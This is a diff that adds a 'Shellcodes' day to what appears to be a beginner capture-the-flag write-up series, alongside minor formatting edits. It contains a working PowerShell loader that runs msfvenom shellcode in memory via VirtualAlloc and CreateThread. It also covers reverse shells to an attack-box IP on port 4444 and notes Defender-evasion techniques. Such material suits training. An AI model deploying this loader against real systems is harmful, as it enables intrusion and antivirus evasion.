@@ -15,6 +15,7 @@ Dive into the wonderful world of cyber security by engaging in festive beginner-
 * [[XXE] Day 5: SOC-mas XX-what-ee?](#xxe-day-5-soc-mas-xx-what-ee)
 * [[Sandboxes] Day 6: If I can't find a nice malware to use, I'm not going.](#sandboxes-day-6-if-i-cant-find-a-nice-malware-to-use-im-not-going)
 * [[AWS Log Analysis] Day 7: Oh, no. I'M SPEAKING IN CLOUDTRAIL!](#aws-log-analysis-day-7-oh-no-im-speaking-in-cloudtrail)
+* [[Shellcodes] Day 8: Shellcodes of the world, unite!](#shellcodes-day-8-shellcodes-of-the-world-unite)
 
 ## [OPSEC] Day 1: Maybe SOC-mas music, he thought, doesn't come from a store?
 
@@ -540,7 +541,7 @@ There are 314 hits for this IP address. After some extensive scrolling, it seems
 After just a few scrolls, we can set requests to a file named `shell.php` with `command` parameter set to various commands such as `ls`, `id`, `echo`, etc. This is an indication of a web shell uploaded to the website.
 
 > **BLUE:** Where was the web shell uploaded to?  
-> **Answer format:** `/directory/directory/directory/filename.php`
+> **Answer format:** `/directory/directory/directory/filename.php`  
 > Answer hint: Look at the `request` field in the logs.
 
 > **BLUE:** What IP address accessed the web shell?  
@@ -659,22 +660,22 @@ Quick overview of the parameters:
 
 ### Answering questions
 
-> What was the flag found in the `.txt` file that is found in the same directory as the `PhishingAttachment.xslm` artefact?
+> What was the flag found in the `.txt` file that is found in the same directory as the `PhishingAttachment.xslm` artefact?  
 > We follow the instructions to find the flag.
 
-> What ATT&CK technique ID would be our point of interest?
+> What ATT&CK technique ID would be our point of interest?  
 > Found on the MITRE ATT&CK framework.
 
-> What ATT&CK subtechnique ID focuses on the Windows Command Shell?
+> What ATT&CK subtechnique ID focuses on the Windows Command Shell?  
 > Found on the MITRE ATT&CK framework.
 
-> What is the name of the Atomic Test to be simulated?
+> What is the name of the Atomic Test to be simulated?  
 > We found one simulating BlackByte ransomware. The result is the name of this test.
 
-> What is the name of the file used in the test?
+> What is the name of the file used in the test?  
 > Found in the script of previously mentioned test.
 
-> What is the flag found from this Atomic Test?
+> What is the flag found from this Atomic Test?  
 > Run the test and find out.
 
 ## [XXE] Day 5: SOC-mas XX-what-ee?
@@ -805,7 +806,7 @@ This is the only request that we see the XML data. Let's send this to Repeater a
 
 We can see the contents of the `/etc/passwd` file. This is a clear indication of XXE vulnerability. Let's try seeing all the wishes. Let's guess the root directory for the web is `/var/www/html`. As our wish are numbered 21, we can be sure that there are 20 wishes before ours.
 
-> What is the flag discovered after navigating through the wishes?
+> What is the flag discovered after navigating through the wishes?  
 > The flag is found in wish 15.
 
 ### Conclusion
@@ -1112,7 +1113,7 @@ While gathering the information for each user, we can focus our investigation on
 * Which OS and browser does each user usually use?
 * Are there any similarities or explicit differences between the IP addresses and operating systems used?
 
-Based on the results, we have proven that McSkidy used a different IP address before the unusual authentication was discovered. Moreover, all evidence seems to point towards another user after correlating the IP address and **User-Agent** used by each user. Who do you think it could be? McSkidy has processed all the investigation results and summarized them below:
+Based on the results, we have proven that McSkidy used a different IP address before the unusual authentication was discovered. Moreover, all evidence seems to point towards another user after correlating the IP address and **User-Agent** used by each user. McSkidy has processed all the investigation results and summarized them below:
 * The incident starts with an anomalous login with the user account `mcskidy` from IP `53.94.201.69`.
 * Shortly after the login, an anomalous user account `glitch` was created.
 * Then, the `glitch` user account was assigned administrator permissions.
@@ -1132,3 +1133,134 @@ As shown above, the Care4wares Fund received all the donations until it changed 
 | 2024-11-28 15:22:18 | CloudWatch RDS logs (rds.log)         | Last donation received by the Care4wares Fund. |
 | 2024-11-28 15:22:39 | CloudTrail logs (cloudtrail_log.json) | Bank details update on S3 bucket.              |
 | 2024-11-28 15:23:02 | CloudWatch RDS logs (rds.log)         | First donation received by Mayor Malware.      |
+
+## [Shellcodes] Day 8: Shellcodes of the world, unite!
+
+### The Story
+
+Glitch, a skilled but mistrusted hacker, was prepping for a tech conference. He was eager to share his shellcode script that remotely accessed his home system. As he worked, he noticed Mayor Malware's henchmen lurking nearby.
+
+*"They're wasting their time. I don't have anything they'd want,"* Glitch chuckled.
+
+He didn't realise that hidden in his home system was something they desperately sought - a research paper he wrote on Wareville's defences, a treasure Mayor Malware was eager to obtain.
+
+### Learning Objectives
+
+* Grasp the fundamentals of writing shellcode
+* Generate shellcode for reverse shells
+* Executing shellcode with PowerShell
+
+### Essential Terminologies
+
+*A reverse shell to his system so tight,*  
+*He planned to showcase at the tech conference night.*  
+*Eager to share how his shellcode could impress,*  
+*He aimed to enlighten, to teach and progress.*
+
+Shellcode is an advanced topic, but knowing these foundational ideas will make the rest of the material more accessible and engaging.
+* **Shellcode:** A piece of code usually used by malicious actors during exploits like buffer overflow attacks to inject commands into a vulnerable system, often leading to executing arbitrary commands or giving attackers control over a compromised machine. Shellcode is typically written in assembly language and delivered through various techniques, depending on the exploited vulnerability.
+* **Powershell:** A powerful scripting language and command-line shell built into Windows for task automation and configuration management. It allows users to interact with system components and is widely used by administrators for legitimate purposes. However, attackers often use PowerShell as a post-exploitation tool because of its deep access to system resources and ability to run scripts directly in memory, avoiding disk-based detection mechanisms.
+* **Windows Defender:** A built-in security feature that detects and prevents malicious scripts, including PowerShell-based attacks, by scanning code at runtime. Common bypass methods for evading Defender include obfuscating scripts to disguise malicious content, making it harder for the software to recognise known patterns. Another technique is a reflective injection, where malicious code is loaded directly into memory, avoiding detection by signature-based defences.
+* **Windows API:** The Windows Application Programming Interface (API) allows programs to interact with the underlying operating system, giving them access to essential system-level functions such as memory management, file operations, and networking. It serves as a bridge between the application and the operating system, enabling efficient resource handling. The Windows API is crucial because many exploitation techniques and malware rely on it to manipulate processes, allocate memory, and execute shellcodes. Common Windows API functions frequently used by malicious actors include `VirtualAlloc`, `CreateThread`, `WaitForSingleObject`.
+* **Accessing Windows API through PowerShell Reflection:** Windows API via PowerShell Reflection is an advanced technique that enables dynamic interaction with the Windows API from PowerShell. Instead of relying on precompiled binaries, PowerShell Reflection allows attackers to call Windows API functions directly at runtime. This will enable them to manipulate low-level system processes, making it a primary tool for bypassing security mechanisms, interacting with the operating system, and executing code stealthily.
+* **Reverse shell:** A type of connection in which the target (the machine we're trying to hack) initiates a connection back to our attacking machine.
+
+### Generating Shellcode
+
+*But Mayor Malware's minions, sneaky and sly,*  
+*Found his script and gave it a try.*  
+*They tampered the code, changed port and IP,*  
+*Twisted his work with a sinister glee.*
+
+We can create a shellcode using `msfvenom`.
+
+#### Where is the actual Shellcode?
+
+The actual shellcode is the hex-encoded byte array. The hexadecimal numbers represent the instructions set on the target machine. Computers understand binary (1s and 0s), but hex numbers are just a more human-readable version. So, instead of seeing long strings of 1s and 0s, we see something like `0xfc` instead.
+
+We can execute this shellcode by loading it into memory and then creating a thread for its execution. In this case, we will use PowerShell to call a few Windows APIs via C# code. Below is a simple PowerShell script that will execute our shellcode:
+
+```powershell
+$VrtAlloc = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class VrtAlloc{
+    [DllImport("kernel32")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
+}
+"@
+
+Add-Type $VrtAlloc 
+
+$WaitFor= @"
+using System;
+using System.Runtime.InteropServices;
+
+public class WaitFor{
+ [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
+}
+"@
+
+Add-Type $WaitFor
+
+$CrtThread= @"
+using System;
+using System.Runtime.InteropServices;
+
+public class CrtThread{
+ [DllImport("kernel32", CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+  
+}
+"@
+Add-Type $CrtThread   
+
+[Byte[]] $buf = SHELLCODE_PLACEHOLDER
+[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
+$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
+[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
+```
+
+#### Explantion of the code
+
+The script starts by defining a few C# classes. These classes use the `DllImport` attribute to load specific functions from the `kernel32` DLL, which is part of the Windows API.
+* `VirtualAlloc`: This function allocates memory in the process's address space. It's commonly used in scenarios like this to prepare memory for storing and executing shellcode.
+* `CreateThread`: This function creates a new thread in the process. The thread will execute the shellcode that has been loaded into memory.
+* `WaitForSingleObject`: This function pauses execution until a specific thread finishes its task. In this case, it ensures that the shellcode has completed execution.
+
+These classes are then added to PowerShell using the `Add-Type` command, allowing PowerShell to use these functions.
+
+#### Storing the shellcode in a Byte Array
+
+Next, the script stores the shellcode in the `$buf` variable, a byte array. In the example above, `SHELLCODE_PLACEHOLDER` is just there to show where to insert the actual shellcode earlier generated through `msfvenom`. Usually, we'd replace it with the real shellcode, represented as a series of hexadecimal values. These hex values are the instructions that will be executed when the shellcode runs.
+
+#### Allocating Memory for the Shellcode
+
+The `VirtualAlloc` function then allocates a block of memory where the shellcode will be stored. The script uses the following arguments:
+* `0` for the memory address, meaning that Windows will decide where to allocate the memory.
+* `$size` for the size of the memory block, which is determined by the length of the shellcode.
+* `0x3000` for the allocation type, which tells Windows to reserve and commit the memory.
+* `0x40` for memory protection, the memory is readable and executable (necessary for executing shellcode).
+
+After memory is allocated, the `Marshal.Copy` function copies the shellcode from the `$buf` array into the allocated memory address (`$addr`), preparing it for execution.
+
+#### Executing the Shellcode and Waiting for Completion
+
+Once the shellcode is stored in memory, the script calls the `CreateThread` function to execute the shellcode by creating a new thread. This thread is instructed to start execution from the memory address where the shellcode is located (`$addr`). The script then uses the `WaitForSingleObject` function, ensuring it waits for the shellcode execution to finish before continuing. This makes sure that the shellcode runs completely before the script ends its execution.
+
+### Regaining Access
+
+*Now Glitch must act, no time to delay,*  
+*To fix the shellcode and keep foes at bay.*  
+*He tweaks and he codes to set the wrongs right,*  
+*Protecting his secrets with all of his might.*
+
+Let's dive into the story and troubleshoot the issue in this part of the task. Glitch has realised he's no longer receiving incoming connections from his home base. Mayor Malware's minion team seems to have tampered with the shellcode and updated both the IP and port, preventing Glitch from connecting. The correct IP address for Glitch is `ATTACKBOX_IP`, and the successful connection port should be 4444.
+
+### Answering the Questions
+
+> What is the flag value once Glitch gets reverse shell on the digital vault using port 4444?  
+> We follow the instructions and get the answer.
